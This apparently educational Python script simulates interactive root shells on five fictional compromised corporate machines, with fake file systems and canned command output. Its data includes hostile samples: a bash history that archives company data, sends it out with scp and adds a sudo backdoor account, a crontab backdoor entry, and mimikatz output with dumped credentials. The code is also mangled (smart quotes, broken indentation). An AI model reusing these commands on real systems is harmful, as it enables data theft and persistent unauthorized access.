#!/usr/bin/env python3
“””
NexCorp Industries — Interactive Shell Demo
Hackademy red team simulation · Educational use only
“””

import os, sys, time, random, subprocess, threading

# ── colours ──────────────────────────────────────────

R  = “\033[1;31m”;  G  = “\033[1;32m”;  Y  = “\033[1;33m”
C  = “\033[1;36m”;  W  = “\033[1;37m”;  D  = “\033[2m”;   X = “\033[0m”
BG = “\033[1;32m”   # bright green for prompt

def clr(): os.system(‘clear’)

# ══════════════════════════════════════════════════════

# FILESYSTEM TREES  (fake but realistic)

# ══════════════════════════════════════════════════════

# Each machine: dict of path → list of (name, type, size, perms)

# type: ‘d’=dir  ‘f’=file

FS = {
“srv-prod01”: {
“/”: [
(“bin”,“d”,””,“drwxr-xr-x”),(“boot”,“d”,””,“drwxr-xr-x”),
(“etc”,“d”,””,“drwxr-xr-x”),(“home”,“d”,””,“drwxr-xr-x”),
(“opt”,“d”,””,“drwxr-xr-x”),(“root”,“d”,””,“drwx——”),
(“tmp”,“d”,””,“drwxrwxrwt”),(“usr”,“d”,””,“drwxr-xr-x”),
(“var”,“d”,””,“drwxr-xr-x”),
],
“/root”: [
(”.bash_history”,“f”,“4.1K”,”-rw—––”),
(”.ssh”,“d”,””,”-rwx——”),
(“recon”,“d”,””,“drwx——”),
],
“/root/.ssh”: [
(“authorized_keys”,“f”,“412”,“rw—––”),
(“id_rsa”,“f”,“1.7K”,”-rw—––”),
(“id_rsa.pub”,“f”,“401”,”-rw-r–r–”),
],
“/root/recon”: [
(“nmap_internal.txt”,“f”,“28K”,”-rw—––”),
(“passwords_found.txt”,“f”,“3.2K”,”-rw—––”),
],
“/etc”: [
(“passwd”,“f”,“2.8K”,”-rw-r–r–”),
(“shadow”,“f”,“4.3K”,”-rw-r—–”),
(“hosts”,“f”,“312”,”-rw-r–r–”),
(“crontab”,“f”,“1.1K”,”-rw-r–r–”),
(“ssh”,“d”,””,“drwxr-xr-x”),
],
“/var/www/html”: [
(“index.php”,“f”,“8.4K”,”-rw-r–r–”),
(“config”,“d”,””,“drwxr-x—”),
(“uploads”,“d”,””,“drwxrwxrwx”),
],
“/var/www/html/config”: [
(“db.php”,“f”,“2.1K”,”-rw-r—–”),
(“app.php”,“f”,“5.7K”,”-rw-r—–”),
(“mail.php”,“f”,“1.4K”,”-rw-r—–”),
],
“/opt/nexcorp”: [
(“data”,“d”,””,“drwxr-x—”),
(“scripts”,“d”,””,“drwxr-x—”),
(“backups”,“d”,””,“drwxr-x—”),
],
“/opt/nexcorp/data”: [
(“employees.sql”,“f”,“812K”,”-rw-r—–”),
(“clients.sql”,“f”,“1.4M”,”-rw-r—–”),
(“contracts.zip”,“f”,“3.2M”,”-rw-r—–”),
],
“/opt/nexcorp/backups”: [
(“db_backup_2026-03-18.tar.gz”,“f”,“4.8G”,”-rw-r—–”),
(“db_backup_2026-03-11.tar.gz”,“f”,“4.7G”,”-rw-r—–”),
],
“/home”: [
(“jbrown”,“d”,””,“drwxr-xr-x”),
(“mfemi”,“d”,””,“drwxr-xr-x”),
(“deploy”,“d”,””,“drwxr-xr-x”),
],
“/home/jbrown”: [
(”.bash_history”,“f”,“2.1K”,”-rw—––”),
(“notes.txt”,“f”,“884”,”-rw-r–r–”),
(“deploy_keys”,“d”,””,“drwx——”),
],
“/tmp”: [
(“tmux-1000”,“d”,””,“drwx——”),
(”.x11-unix”,“d”,””,“drwxrwxrwt”),
(“sess_4f8a”,“f”,“512”,”-rw—––”),
],
},

```
"db-mysql01": {
    "/": [
        ("bin","d","","drwxr-xr-x"),("etc","d","","drwxr-xr-x"),
        ("home","d","","drwxr-xr-x"),("root","d","","drwx------"),
        ("var","d","","drwxr-xr-x"),("tmp","d","","drwxrwxrwt"),
    ],
    "/root": [
        (".bash_history","f","5.8K","-rw-------"),
        (".mysql_history","f","18K","-rw-------"),
        ("dump","d","","drwx------"),
    ],
    "/root/dump": [
        ("nexcorp_full_2026-03-21.sql","f","2.1G","-rw-------"),
        ("users_plain.txt","f","44K","-rw-------"),
        ("schema.txt","f","18K","-rw-------"),
    ],
    "/var/lib/mysql": [
        ("nexcorp_prod","d","","drwx------"),
        ("mysql","d","","drwx------"),
        ("performance_schema","d","","drwx------"),
    ],
    "/var/lib/mysql/nexcorp_prod": [
        ("customers.ibd","f","2.1G","-rw-r-----"),
        ("employees.ibd","f","890M","-rw-r-----"),
        ("invoices.ibd","f","440M","-rw-r-----"),
        ("users.ibd","f","210M","-rw-r-----"),
        ("sessions.ibd","f","88M","-rw-r-----"),
    ],
    "/etc/mysql": [
        ("my.cnf","f","4.2K","-rw-r--r--"),
        ("debian.cnf","f","3.2K","-rw-------"),
        ("conf.d","d","","drwxr-xr-x"),
    ],
    "/home": [
        ("dbadmin","d","","drwxr-xr-x"),
    ],
    "/home/dbadmin": [
        (".bash_history","f","3.3K","-rw-------"),
        ("backup.sh","f","2.1K","-rwxr-x---"),
        (".ssh","d","","drwx------"),
    ],
    "/tmp": [
        ("mysql_exfil.py","f","3.4K","-rwxr--r--"),
        (".hidden_shell","f","1.2K","-rwxr--r--"),
    ],
},

"wkstn-adm02": {
    "C:\\": [
        ("Users","d","",""),("Windows","d","",""),
        ("Program Files","d","",""),("inetpub","d","",""),
        ("Temp","d","",""),
    ],
    "C:\\Users": [
        ("kadmin","d","",""),("Administrator","d","",""),
        ("Public","d","",""),
    ],
    "C:\\Users\\kadmin": [
        ("Desktop","d","",""),("Documents","d","",""),
        ("Downloads","d","",""),(".ssh","d","",""),
        ("AppData","d","",""),
    ],
    "C:\\Users\\kadmin\\Desktop": [
        ("server_map.xlsx","f","128K",""),
        ("VPN_access.txt","f","2.1K",""),
        ("TODO.txt","f","812",""),
    ],
    "C:\\Users\\kadmin\\Documents": [
        ("VPN_Credentials.docx","f","44K",""),
        ("NexCorp_Q1_Budget.xlsx","f","2.8M",""),
        ("Board_Meeting_Mar2026.pptx","f","8.4M",""),
        ("IT_Asset_Register.xlsx","f","1.1M",""),
    ],
    "C:\\Users\\kadmin\\Downloads": [
        ("AnyDesk.exe","f","4.2M",""),
        ("putty.exe","f","1.1M",""),
    ],
    "C:\\Windows\\NTDS": [
        ("ntds.dit","f","11M",""),
        ("edb.log","f","4.1M",""),
    ],
    "C:\\Temp": [
        ("beacon.exe","f","184K",""),
        ("mimikatz_output.txt","f","28K",""),
        ("lsass.dmp","f","44M",""),
    ],
},

"cctv-hub": {
    "/": [
        ("bin","d","","drwxr-xr-x"),("etc","d","","drwxr-xr-x"),
        ("mnt","d","","drwxr-xr-x"),("tmp","d","","drwxrwxrwt"),
        ("var","d","","drwxr-xr-x"),
    ],
    "/mnt/nvr": [
        ("2026-03-21","d","","drwxr-xr-x"),
        ("2026-03-20","d","","drwxr-xr-x"),
        ("2026-03-19","d","","drwxr-xr-x"),
    ],
    "/mnt/nvr/2026-03-21": [
        ("ch01_lobby.mp4","f","4.1G","-rw-r--r--"),
        ("ch02_carpark.mp4","f","4.1G","-rw-r--r--"),
        ("ch03_reception.mp4","f","4.1G","-rw-r--r--"),
        ("ch04_corridor.mp4","f","4.1G","-rw-r--r--"),
        ("ch05_serverroom.mp4","f","4.1G","-rw-r--r--"),
        ("ch06_finance.mp4","f","4.1G","-rw-r--r--"),
        ("ch07_boardroom.mp4","f","4.1G","-rw-r--r--"),
        ("ch08_exit.mp4","f","4.1G","-rw-r--r--"),
    ],
    "/etc": [
        ("hikvision","d","","drwxr-xr-x"),
        ("passwd","f","812","-rw-r--r--"),
        ("hosts","f","214","-rw-r--r--"),
    ],
    "/etc/hikvision": [
        ("device.conf","f","8.2K","-rw-r--r--"),
        ("network.conf","f","3.1K","-rw-r--r--"),
        ("users.conf","f","1.4K","-rw-r--r--"),
    ],
    "/tmp": [
        ("stream_tap.sh","f","884","-rwxr--r--"),
    ],
},

"mail-ex01": {
    "C:\\": [
        ("inetpub","d","",""),("Program Files","d","",""),
        ("Exports","d","",""),("Windows","d","",""),("Temp","d","",""),
    ],
    "C:\\inetpub\\wwwroot\\owa\\auth": [
        ("svcdiag.aspx","f","6.1K",""),
        ("logon.aspx","f","44K",""),
    ],
    "C:\\Exports": [
        ("ceo_mailbox_full.pst","f","1.8G",""),
        ("finance_Q1_Q2.pst","f","740M",""),
        ("hr_all_staff.pst","f","2.1G",""),
    ],
    "C:\\Temp": [
        ("proxylogon_payload.aspx","f","4.2K",""),
        ("ad_users_dump.txt","f","88K",""),
    ],
    "C:\\Windows\\System32": [
        ("cmd.exe","f","284K",""),
        ("net.exe","f","84K",""),
        ("whoami.exe","f","28K",""),
    ],
},
```

}

# ══════════════════════════════════════════════════════

# FILE CONTENTS  (cat output for key files)

# ══════════════════════════════════════════════════════

FILE_CONTENTS = {
“/etc/shadow”: “””  
root:$6$rG8.sK2a$X1HJKmP9nQvLzT3wB8dYeAoU7cF5iN0pRs4tVuMxEq1yWjCb6Z.:19073:0:99999:7:::
daemon:*:18884:0:99999:7:::
bin:*:18884:0:99999:7:::
www-data:$6$mN7.xP3b$Y2IJLnQ0oRwMaU4vC9eZfBpV8dG6jO1qSt5uWvNyFr2zXkDc7A.:19070:0:99999:7:::
jbrown:$6$pK4.yQ5c$Z3JKMoR1pSxNbV5wD0fAgCqW9eH7kP2rTu6vXwOzGs3aYlEd8B.:19071:0:99999:7:::
mfemi:$6$qL5.zR6d$A4KLNpS2qTyOcW6xE1gBhDrX0fI8lQ3sTv7wYxPaHt4bZmFe9C.:19072:0:99999:7:::
deploy:$6$rM6.aS7e$B5LMOqT3rUzPdX7yF2hCiEsY1gJ9mR4tUw8xZyQbIu5cAnGf0D.:19068:0:99999:7:::”””,

```
"/etc/passwd": """\
```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
jbrown:x:1001:1001:James Brown,,,:/home/jbrown:/bin/bash
mfemi:x:1002:1002:Michael Femi,,,:/home/mfemi:/bin/bash
deploy:x:1003:1003:Deploy User,,,:/home/deploy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/var/lib/mysql:/bin/false”””,

```
"/etc/hosts": """\
```

127.0.0.1       localhost
127.0.1.1       srv-nexcorp-prod01
172.16.4.23     srv-nexcorp-prod01   prod01
172.16.4.31     db-nexcorp-mysql01   db01
172.16.4.18     mail-nexcorp-ex01    mail01
172.16.2.11     wkstn-nxc-adm02      adm02
192.168.10.5    cctv-hub-nxc-gf      cctv01”””,

```
"/var/www/html/config/db.php": """\
```

<?php
// NexCorp Production Database Configuration
// WARNING: Do not commit this file to version control

define('DB_HOST', '172.16.4.31');
define('DB_PORT', '3306');
define('DB_NAME', 'nexcorp_prod');
define('DB_USER', 'nexcorp_app');
define('DB_PASS', 'Nx@Pr0d#2024!');
define('DB_CHARSET', 'utf8mb4');

$pdo = new PDO(
    "mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=".DB_CHARSET,
    DB_USER, DB_PASS,
    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
);
?>""",

```
"/root/recon/passwords_found.txt": """\
```

# Credentials harvested from NexCorp infrastructure

# Date: 2026-03-19

[SSH / System]
root@srv-nexcorp-prod01        Nx@Pr0d#R00t2024
jbrown@172.16.4.23             James@Nexcorp1!
deploy@172.16.4.23             d3pl0y_s3cr3t_99

[Database]
nexcorp_app (MySQL)            Nx@Pr0d#2024!
root (MySQL)                   MySQL_r00t_Nx2023

[Web Portal]
admin@nexcorp.com              Admin#Nexcorp2024
it.support@nexcorp.com         Support@123

[VPN]
kadmin / NEXCORP domain        K@dmin_NxC0rp!2025
“””,

```
"/home/jbrown/notes.txt": """\
```

TODO:

- Renew SSL cert on prod (expires May 2026)
- Update backup rotation policy
- Follow up with vendor re: Tomcat patch
- Password reset for mfemi account (still using old one)

Server IPs (internal):
prod: 172.16.4.23
db:   172.16.4.31
mail: 172.16.4.18
cctv: 192.168.10.5
“””,

```
"/etc/crontab": """\
```

# NexCorp crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

0  2  *  *  *  root    /opt/nexcorp/scripts/db_backup.sh
30 3  *  *  *  deploy  /opt/nexcorp/scripts/deploy_check.sh
*/5 * *  *  *  root    /opt/nexcorp/scripts/healthcheck.sh
@reboot        root    /opt/nexcorp/scripts/startup.sh

# backdoor

*/10 * *  *  *  root   /tmp/.x11-unix/.svc >/dev/null 2>&1”””,

```
"/etc/hikvision/device.conf": """\
```

[Device]
DeviceName=NexCorp-CCTV-Hub-GF
DeviceModel=DS-7608NI-K2
SerialNo=DS-7608NI-K2/00000001
FirmwareVersion=V3.4.102 build 200508
HardwareVersion=0x0

[Network]
IPAddress=192.168.10.5
SubnetMask=255.255.255.0
GatewayIPAddress=192.168.10.1
DNS1=8.8.8.8

[RTSP]
Enabled=true
Port=554
Auth=disable

[Channels]
Ch01=Lobby-Main-Entrance
Ch02=Car-Park-Level-1
Ch03=Reception-Desk
Ch04=Corridor-1st-Floor
Ch05=Server-Room
Ch06=Finance-Department
Ch07=Boardroom
Ch08=Emergency-Exit
“””,

```
"/etc/hikvision/users.conf": """\
```

[Users]
admin:12345:Administrator
operator:nexcorp2024:Operator
viewer:viewer123:ViewOnly
“””,

```
"/root/.bash_history": """\
```

ssh root@172.16.4.31
mysql -u root -p
cat /etc/shadow
tar czf /tmp/loot.tar.gz /opt/nexcorp/data
scp /tmp/loot.tar.gz 10.0.0.44:/received/
find / -name “*.conf” -readable 2>/dev/null
netstat -antup
ps aux | grep apache
cat /var/www/html/config/db.php
crontab -e
useradd -m -s /bin/bash -G sudo backdoor
echo “backdoor:P@ssw0rd123” | chpasswd
“””,

```
"C:\\Temp\\mimikatz_output.txt": """\
```

.#####.   mimikatz 2.2.0 (x64) #19041
.## ^ ##.  “A La Vie, A L’Amour”

## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

## \ / ##       > https://blog.gentilkiwi.com/mimikatz

‘## v ##’
‘#####’

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 12345 (00000000:00003039)
Session           : Interactive from 2
User Name         : kadmin
Domain            : NEXCORP
Logon Server      : NEXCORP-DC01
Logon Time        : 3/21/2026 9:14:32 AM

```
    msv :
     [00000003] Primary
     * Username : kadmin
     * Domain   : NEXCORP
     * NTLM     : e3b0c44298fc1c149afb4c8996fb924
     * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

    wdigest :
     * Username : kadmin
     * Domain   : NEXCORP
     * Password : K@dmin_NxC0rp!2025

    kerberos :
     * Username : kadmin
     * Domain   : NEXCORP.LOCAL
     * Password : K@dmin_NxC0rp!2025
```

“””,

```
"C:\\Users\\kadmin\\Desktop\\VPN_access.txt": """\
```

## NexCorp VPN Access Credentials

VPN Gateway : vpn.nexcorp.com:1194
Protocol    : OpenVPN

Username    : kadmin@nexcorp.com
Password    : K@dmin_NxC0rp!2025
MFA Token   : TOTP (Google Auth)
Backup Code : 84729-10384

Note: Share only with authorised IT staff
“””,

```
"C:\\Users\\kadmin\\Desktop\\TODO.txt": """\
```

- Patch Exchange server (ProxyLogon still open??)
- Review firewall rules with Emeka
- Schedule pentest for Q2
- Update AD password policy
- URGENT: follow up cctv vendor about default creds
  “””,
  }

# ══════════════════════════════════════════════════════

# MACHINE DEFINITIONS

# ══════════════════════════════════════════════════════

MACHINES = {
“1”: {
“id”:       “srv-prod01”,
“label”:    “srv-nexcorp-prod01”,
“ip”:       “172.16.4.23”,
“os”:       “Ubuntu 18.04.5 LTS”,
“user”:     “root”,
“home”:     “/root”,
“cwd_init”: “/root”,
“type”:     “linux”,
“prompt_color”: G,
“banner”:   f”{D}Linux srv-nexcorp-prod01 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021 x86_64{X}”,
},
“2”: {
“id”:       “db-mysql01”,
“label”:    “db-nexcorp-mysql01”,
“ip”:       “172.16.4.31”,
“os”:       “Debian GNU/Linux 10”,
“user”:     “root”,
“home”:     “/root”,
“cwd_init”: “/root”,
“type”:     “linux”,
“prompt_color”: R,
“banner”:   f”{D}Linux db-nexcorp-mysql01 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 x86_64{X}”,
},
“3”: {
“id”:       “wkstn-adm02”,
“label”:    “wkstn-nxc-adm02”,
“ip”:       “172.16.2.11”,
“os”:       “Windows 10 Pro (19045)”,
“user”:     “NEXCORP\kadmin”,
“home”:     “C:\Users\kadmin”,
“cwd_init”: “C:\Users\kadmin”,
“type”:     “windows”,
“prompt_color”: Y,
“banner”:   f”{D}Microsoft Windows [Version 10.0.19045.3693]{X}”,
},
“4”: {
“id”:       “cctv-hub”,
“label”:    “cctv-hub-nxc-gf”,
“ip”:       “192.168.10.5”,
“os”:       “Embedded Linux (BusyBox)”,
“user”:     “root”,
“home”:     “/”,
“cwd_init”: “/”,
“type”:     “linux”,
“prompt_color”: C,
“banner”:   f”{D}BusyBox v1.30.1 (2020-03-25) built-in shell (ash){X}”,
},
“5”: {
“id”:       “mail-ex01”,
“label”:    “mail-nexcorp-ex01”,
“ip”:       “172.16.4.18”,
“os”:       “Windows Server 2016 (Exchange 2019)”,
“user”:     “NT AUTHORITY\SYSTEM”,
“home”:     “C:\Windows\System32”,
“cwd_init”: “C:\Windows\System32”,
“type”:     “windows”,
“prompt_color”: Y,
“banner”:   f”{D}Microsoft Windows [Version 10.0.14393.5125]{X}”,
},
}

# ══════════════════════════════════════════════════════

# COMMAND HANDLERS

# ══════════════════════════════════════════════════════

def fmt_ls(entries, long=False):
lines = []
if long:
now = “Mar 21 04:14”
for name, typ, size, perms in entries:
color = C if typ == ‘d’ else W
p = perms if perms else “-rw-r–r–”
s = size if size else “-”
lines.append(f”{D}{p}  root root  {s:>8}  {now}{X}  {color}{name}{X}”)
else:
names = []
for name, typ, size, perms in entries:
names.append((C if typ == ‘d’ else W) + name + X)
# format in columns
lines.append(”  “.join(names))
return “\n”.join(lines)

def resolve_path(cwd, arg, machine):
“”“Resolve a path argument relative to cwd.”””
arg = arg.strip().rstrip(’/’)
if not arg:
return cwd
# Windows: if starts with drive letter
if len(arg) >= 2 and arg[1] == ‘:’:
return arg
if arg.startswith(’/’) or arg.startswith(‘C:\’) or arg.startswith(‘c:\’):
return arg
if arg == ‘..’:
if ‘\’ in cwd:
parts = cwd.rsplit(’\’, 1)
return parts[0] if parts[0] else ‘\’
else:
parts = cwd.rsplit(’/’, 1)
return parts[0] if parts[0] else ‘/’
if arg == ‘.’:
return cwd
sep = ‘\’ if ‘\’ in cwd else ‘/’
return cwd.rstrip(sep) + sep + arg

def handle_command(raw, machine, cwd):
“”“Process a command string, return (output, new_cwd).”””
raw = raw.strip()
if not raw:
return “”, cwd

```
parts = raw.split()
cmd   = parts[0].lower()
args  = parts[1:]
fs    = FS.get(machine["id"], {})
typ   = machine["type"]

# ── universal ──
if cmd in ("exit", "quit"):
    return f"{Y}Session closed.{X}", "__EXIT__"

if cmd == "clear":
    clr()
    return "", cwd

if cmd in ("whoami", "id") and typ == "linux":
    if machine["user"] == "root":
        return f"root\nuid=0(root) gid=0(root) groups=0(root)", cwd
    return machine["user"], cwd

if cmd == "whoami" and typ == "windows":
    return machine["user"], cwd

if cmd == "id" and typ == "windows":
    return f"User: {machine['user']}\nPrivilege: SeDebugPrivilege, SeTcbPrivilege (SYSTEM)", cwd

if cmd == "pwd":
    return cwd, cwd

if cmd in ("hostname",):
    return machine["label"], cwd

if cmd == "uname" and typ == "linux":
    if "-a" in args:
        return f"Linux {machine['label']} 4.15.0-142-generic #146-Ubuntu SMP x86_64 GNU/Linux", cwd
    return "Linux", cwd

if cmd in ("ls", "dir"):
    long = "-la" in args or "-l" in args or "-a" in args
    target = cwd
    non_flag = [a for a in args if not a.startswith('-')]
    if non_flag:
        target = resolve_path(cwd, non_flag[0], machine)
    if target in fs:
        return fmt_ls(fs[target], long), cwd
    # try parent
    for k in fs:
        if k.lower() == target.lower():
            return fmt_ls(fs[k], long), cwd
    return f"{R}ls: cannot access '{target}': No such file or directory{X}", cwd

if cmd == "cd":
    if not args:
        return "", machine["home"]
    target = resolve_path(cwd, args[0], machine)
    # check exists
    for k in fs:
        if k.lower() == target.lower():
            # check it's a dir
            parent = target.rsplit('/' if '/' in target else '\\', 1)[0] or '/'
            if parent in fs:
                for name, typ2, size, perms in fs.get(parent, []):
                    sep = '\\' if '\\' in target else '/'
                    if (parent.rstrip(sep) + sep + name).lower() == target.lower() and typ2 == 'd':
                        return "", target
            return "", target
    if target in fs:
        return "", target
    return f"{R}bash: cd: {target}: No such file or directory{X}", cwd

if cmd == "cat":
    if not args:
        return f"{R}cat: missing operand{X}", cwd
    path = resolve_path(cwd, args[0], machine)
    # check hardcoded contents
    for k, v in FILE_CONTENTS.items():
        if k.lower() == path.lower():
            return v, cwd
    # check if it's a file in FS
    parent = path.rsplit('/' if '/' in path else '\\', 1)
    if len(parent) == 2:
        parent_dir = parent[0] or '/'
        fname = parent[1]
        if parent_dir in fs:
            for name, typ2, size, perms in fs[parent_dir]:
                if name.lower() == fname.lower():
                    if typ2 == 'f':
                        return f"{D}[binary or large file — use strings or hexdump]{X}", cwd
                    return f"{R}cat: {path}: Is a directory{X}", cwd
    return f"{R}cat: {path}: No such file or directory{X}", cwd

if cmd == "ps" and typ == "linux":
    return f"""{D}  PID TTY          TIME CMD{X}
1 ?        00:00:03 systemd
```

214 ?        00:00:00 sshd
891 ?        00:00:44 apache2
892 ?        00:00:12 apache2
1104 ?        00:04:21 mysqld
1840 pts/0    00:00:00 bash
2201 pts/0    00:00:00 python3
2244 pts/0    00:00:00 ps”””, cwd

```
if cmd == "netstat" and typ == "linux":
    return f"""{D}Active Internet connections (servers and established)
```

Proto Recv-Q Send-Q Local Address           Foreign Address         State{X}
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN
{R}tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN{X}
{R}tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN{X}
tcp        0    324 172.16.4.23:4444        10.0.0.44:51234         ESTABLISHED
tcp        0      0 172.16.4.23:22          10.0.0.44:51100         ESTABLISHED”””, cwd

```
if cmd == "ifconfig" and typ == "linux":
    return f"""{D}eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 172.16.4.23  netmask 255.255.255.0  broadcast 172.16.4.255
    inet6 fe80::250:56ff:feb8:4a12  prefixlen 64
    ether 00:50:56:b8:4a:12  txqueuelen 1000
```

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
inet 127.0.0.1  netmask 255.0.0.0{X}”””, cwd

```
if cmd == "ip" and "addr" in args:
    return f"""{D}1: lo: <LOOPBACK,UP,LOWER_UP>
link/loopback 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
```

2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
link/ether 00:50:56:b8:4a:12
inet 172.16.4.23/24 brd 172.16.4.255 scope global eth0{X}”””, cwd

```
if cmd == "history":
    return FILE_CONTENTS.get("/root/.bash_history", ""), cwd

if cmd == "find":
    if "-name" in args:
        idx = args.index("-name")
        pattern = args[idx+1] if idx+1 < len(args) else "*"
        pat = pattern.strip('"').strip("'").replace("*","")
        results = []
        for path, entries in fs.items():
            for name, typ2, size, perms in entries:
                if pat.lower() in name.lower():
                    sep = '/' if '/' in path else '\\'
                    results.append(path.rstrip(sep) + sep + name)
        return "\n".join(results) if results else f"{D}(no results){X}", cwd
    return f"{D}(use find / -name 'pattern'){X}", cwd

if cmd == "grep":
    return f"{D}(grep on static filesystem — use cat to view file contents){X}", cwd

if cmd in ("wget","curl"):
    url = args[0] if args else "http://example.com"
    time.sleep(1.2)
    return f"""{D}--2026-03-21 04:14:{random.randint(10,59)}--  {url}
```

Resolving {url.split(’/’)[2]}… 10.0.0.44
Connecting to 10.0.0.44:80… connected.
HTTP request sent, awaiting response… 200 OK
Length: {random.randint(10000,500000)} bytes
Saving to: ‘{url.split(’/’)[-1]}’

{url.split(’/’)[-1]}     100%[=================>] done.{X}”””, cwd

```
if cmd == "ssh":
    host = args[-1] if args else "unknown"
    time.sleep(0.8)
    return f"{G}Connected to {host} — use exit to return{X}", cwd

if cmd == "python3" or cmd == "python":
    return f"{D}Python 3.8.10 (default, Nov 14 2022)\nType 'exit()' to quit.{X}", cwd

if cmd == "mysql":
    return f"{D}Welcome to the MySQL monitor.\nmysql>{X}", cwd

if cmd in ("sudo", "su"):
    return f"{D}[sudo] root — already root{X}", cwd

if cmd in ("ipconfig", "netstat") and typ == "windows":
    return f"""{D}Windows IP Configuration
```

Ethernet adapter Ethernet0:
IPv4 Address. . . . . . . : 172.16.2.11
Subnet Mask . . . . . . . : 255.255.255.0
Default Gateway . . . . . : 172.16.2.1{X}”””, cwd

```
if cmd == "systeminfo" and typ == "windows":
    return f"""{D}Host Name:                 WKSTN-NXC-ADM02
```

OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
Domain:                    NEXCORP
Logon Server:              \\NEXCORP-DC01
Total Physical Memory:     16,384 MB{X}”””, cwd

```
if cmd == "net" and args and args[0] == "user":
    return f"""{D}User accounts for \\\\WKSTN-NXC-ADM02
```

Administrator     kadmin     Guest
domain_svc        backup_svc

The command completed successfully.{X}”””, cwd

```
if cmd == "tasklist" and typ == "windows":
    return f"""{D}Image Name                PID    Mem Usage
```

========================  =====  =========
System Idle Process           0        8 K
svchost.exe                 888    24,560 K
lsass.exe                   692    18,240 K
explorer.exe               2144    84,120 K
{R}beacon.exe                 3812    12,440 K{X}”””, cwd

```
if cmd in ("dir",) and typ == "windows":
    entries = fs.get(cwd, [])
    lines = [f" Directory of {cwd}\n"]
    for name, t, size, perms in entries:
        tag = "<DIR>          " if t == 'd' else f"       {size:>10} "
        lines.append(f"21/03/2026  04:14    {tag}{name}")
    return "\n".join(lines), cwd

if cmd == "type" and typ == "windows":
    if not args:
        return f"{R}The syntax of the command is incorrect.{X}", cwd
    path = resolve_path(cwd, args[0], machine)
    for k, v in FILE_CONTENTS.items():
        if k.lower() == path.lower():
            return v, cwd
    return f"{R}The system cannot find the file specified.{X}", cwd

if cmd == "help":
    if typ == "linux":
        return f"""{D}Available: ls  ls -la  cd  pwd  cat  ps  netstat  ifconfig
      ip addr  find -name  history  wget  curl  ssh  mysql
      python3  whoami  id  uname -a  hostname  clear  exit{X}""", cwd
    else:
        return f"""{D}Available: dir  cd  type  whoami  id  ipconfig  netstat
      systeminfo  net user  tasklist  hostname  cls  exit{X}""", cwd

if cmd in ("cls",):
    clr()
    return "", cwd

# unknown
if typ == "linux":
    return f"{R}bash: {parts[0]}: command not found{X}", cwd
else:
    return f"{R}'{parts[0]}' is not recognized as an internal or external command.{X}", cwd
```

# ══════════════════════════════════════════════════════

# SHELL SESSION

# ══════════════════════════════════════════════════════

def run_shell(machine):
clr()
pc = machine[“prompt_color”]
cwd = machine[“cwd_init”]
label = machine[“label”]
user  = machine[“user”]

```
print(f"\n{C}{'━'*58}{X}")
print(f"{C}  ▶  SESSION ACTIVE — {label}  ({machine['ip']}){X}")
print(f"{C}{'━'*58}{X}")
print(machine["banner"])
print(f"{D}  OS: {machine['os']}  |  User: {user}{X}\n")

while True:
    # build prompt
    if machine["type"] == "linux":
        sym = "#" if machine["user"] == "root" else "$"
        prompt = f"{pc}{user}@{label}{X}:{C}{cwd}{X}{sym} "
    else:
        prompt = f"{pc}{cwd}>{X} "

    try:
        raw = input(prompt)
    except (EOFError, KeyboardInterrupt):
        print()
        break

    output, new_cwd = handle_command(raw, machine, cwd)
    if new_cwd == "__EXIT__":
        if output:
            print(output)
        break
    cwd = new_cwd
    if output:
        print(output)
```

# ══════════════════════════════════════════════════════

# MAIN MENU

# ══════════════════════════════════════════════════════

def main_menu():
while True:
clr()
print(f”””
{R}  ██████  ███████ ██████  ██       ██████  ██    ██{X}
{R}  ██   ██ ██      ██   ██ ██      ██    ██  ██  ██ {X}
{R}  ██████  █████   ██   ██ ██      ██    ██   ████  {X}
{R}  ██   ██ ██      ██   ██ ██      ██    ██    ██   {X}
{R}  ██   ██ ███████ ██████  ███████  ██████     ██   {X}

{D}  NexCorp Industries — Active Sessions{X}
{C}  {‘─’*48}{X}

{G}[1]{X}  {G}srv-nexcorp-prod01{X}     {D}172.16.4.23   Ubuntu 18.04   ROOT{X}
{R}[2]{X}  {R}db-nexcorp-mysql01{X}     {D}172.16.4.31   Debian 10      ROOT     ● EXFIL{X}
{Y}[3]{X}  {Y}wkstn-nxc-adm02  {X}     {D}172.16.2.11   Windows 10     SYSTEM{X}
{C}[4]{X}  {C}cctv-hub-nxc-gf  {X}     {D}192.168.10.5  Embedded Linux ROOT{X}
{Y}[5]{X}  {Y}mail-nexcorp-ex01{X}     {D}172.16.4.18   Win Server     SYSTEM{X}

{D}[q]  quit{X}

{C}  {‘─’*48}{X}”””)

```
    try:
        choice = input(f"  {W}Select session ▶ {X}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print(); break

    if choice in MACHINES:
        run_shell(MACHINES[choice])
    elif choice == 'q':
        clr()
        break
    else:
        pass  # just re-show menu
```

if **name** == “**main**”:
main_menu()
